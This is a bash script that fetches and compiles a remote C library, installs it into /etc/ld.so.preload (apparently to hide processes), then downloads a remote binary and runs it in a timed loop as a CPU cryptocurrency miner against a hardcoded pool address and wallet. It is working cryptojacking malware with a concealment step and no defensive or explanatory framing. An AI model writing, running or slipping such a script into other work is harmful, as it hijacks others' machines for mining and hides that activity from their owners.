#!/bin/bash

# Update and install necessary packages
apt-get update
apt-get install -y sudo wget cpulimit build-essential

# Download and compile the C code
curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c

# Prepare the environment
mkdir -p .lib && cd .lib

# Download the binary
wget -O sgr1 https://github.com/barburonjilo/back/raw/main/sr
chmod +x sgr1

while true; do
    # Start the process with cpulimit
    cpulimit -l 400 -e ./sgr1 &
    pid=$!

    # Run the process with the specified parameters
    nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool 45.115.224.59:8443 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &

    # Run for 1 minute
    sleep 60

    # Kill the process after 1 minute
    kill $pid

    # Wait for 2 minutes before starting the next iteration
    sleep 120
done
